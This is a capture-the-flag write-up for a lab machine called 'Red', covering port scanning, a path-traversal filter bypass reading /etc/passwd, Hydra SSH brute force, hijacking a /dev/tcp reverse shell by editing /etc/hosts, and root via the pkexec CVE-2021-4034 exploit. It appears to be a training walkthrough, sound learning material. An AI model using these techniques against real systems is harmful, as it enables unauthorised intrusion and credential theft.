[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&size=35&pause=1000&color=6A0DAD&width=435&lines=Red)](https://git.io/typing-svg)

![image](https://github.com/ACHUX21/Writeups/assets/130113878/5975098a-9a2f-4268-8b75-21409f7da8c2)

## Description

```
The match has started, and Red has taken the lead on you.
But you are Blue, and only you can take Red down.

However, Red has implemented some defense mechanisms that will make the battle a bit difficult:
1. Red has been known to kick adversaries out of the machine. Is there a way around it?
2. Red likes to change adversaries' passwords but tends to keep them relatively the same. 
3. Red likes to taunt adversaries in order to throw off their focus. Keep your mind sharp!

This is a unique battle, and if you feel up to the challenge. Then by all means go for it!
Whenever you are ready, click on the Start Machine button to fire up the Virtual Machine.
```



# Enum

Let's start with a quick Nmap scan.
### Nmap Scan


```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-16 15:48 +01
Nmap scan report for 10.10.27.215
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds
```
It appears that there is an Apache2 web server running on port 80.
I have come across a parameter in the URL. Let's investigate it further by examining the following URL: 

```"http://10.10.27.215/index.php?page=home.html".```


Let's proceed with brute-forcing to discover potential files within this parameter.

```bash
ffuf -u http://10.10.27.215/index.php?page=FUZZ -w /usr/share/wordlists/dirb/common.txt -fw 1
```

```bash
index.php               [Status: 200, Size: 351, Words: 45, Lines: 18]
```
By visiting the provided endpoint, we have discovered a PHP code comment within the source code.

```php
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```
I successfully bypassed the PHP str_replace function by utilizing [php:///filter/resource=/etc/passwd](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
```
It appears that there are three users: root, blue, and red.

I attempted to locate some logs for potential log poisoning, but unfortunately, I couldn't.

Finally, I have managed to obtain some valuable information.

![image](https://github.com/ACHUX21/Writeups/assets/130113878/bbe20e0e-c133-4b98-a554-786782c1615c)

The user "blue" attempted to enhance the security of their password by implementing various rules. However, I was able to get access. 
I generated a password list and successfully performed a brute force attack on "blue"'s password using Hydra.


```bash
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-16 16:16:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:1/p:77), ~5 tries per task
[DATA] attacking ssh://10.10.27.215:22/
[22][ssh] host: 10.10.27.215   login: blue   password: [PASS]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-16 16:16:51
```

![image](https://github.com/ACHUX21/Writeups/assets/130113878/df1d55df-fbc1-424a-be5e-496b96adc92a)

# Priv

I keep getting msg from the shell

![image](https://github.com/ACHUX21/Writeups/assets/130113878/e84fab96-22fe-46b4-8a44-6096304e62e4)

And the password keeps changing every time the shell kicks me out.

Every time I receive a message, I start another shell to continue the process.


By running pspy64;

```toml
2023/07/16 15:25:57 CMD: UID=1001  PID=2685   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
```
I added my IP to /etc/hosts in order to obtain a reverse shell.

```bash
blue@red:/tmp$ echo 10.18.81.222 redrules.thm >> /etc/hosts
```

```bash

achux@Fs:~$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.27.215 33578
bash: cannot set terminal process group (2955): Inappropriate ioctl for device
bash: no job control in this shell
red@red:~$

```

```bash
red@red:~$ ll
total 36
drwxr-xr-x 4 root red  4096 Aug 17  2022 ./
drwxr-xr-x 4 root root 4096 Aug 14  2022 ../
lrwxrwxrwx 1 root root    9 Aug 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 red  red   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 red  red  3771 Feb 25  2020 .bashrc
drwx------ 2 red  red  4096 Aug 14  2022 .cache/
-rw-r----- 1 root red    41 Aug 14  2022 flag2
drwxr-x--- 2 red  red  4096 Aug 14  2022 .git/
-rw-r--r-- 1 red  red   807 Aug 14  2022 .profile
-rw-rw-r-- 1 red  red    75 Aug 14  2022 .selected_editor
-rw------- 1 red  red     0 Aug 17  2022 .viminfo
```

`.git` weird folder!!


```bash
red@red:~/.git$ ll
total 40
drwxr-x--- 2 red  red   4096 Aug 14  2022 ./
drwxr-xr-x 4 root red   4096 Aug 17  2022 ../
-rwsr-xr-x 1 root root 31032 Aug 14  2022 pkexec*
red@red:~/.git$ ./pkexec --version
pkexec version 0.105
```

I believe we can exploit that situation.

[💜 CVE-2021-4034](https://github.com/Almorabea/pkexec-exploit/blob/main/CVE-2021-4034.py)

Simply copying and pasting the exploit will not be sufficient to achieve our goal. 
We need to understand the exploit thoroughly and tailor it to the specific context in order to successfully exploit the vulnerability.

we need to change this part;

![image](https://github.com/ACHUX21/Writeups/assets/130113878/461ff9c5-b4b3-48ec-9f22-1b866bdae411)

![image](https://github.com/ACHUX21/Writeups/assets/130113878/76680a06-8b3c-4b84-8531-4989a8dc859d)

```bash


# whoami
root

```

Congratulations on successfully compromising the machine! Well done! If you need any further assistance in the future, feel free to reach out. Take care and goodbye! 💜
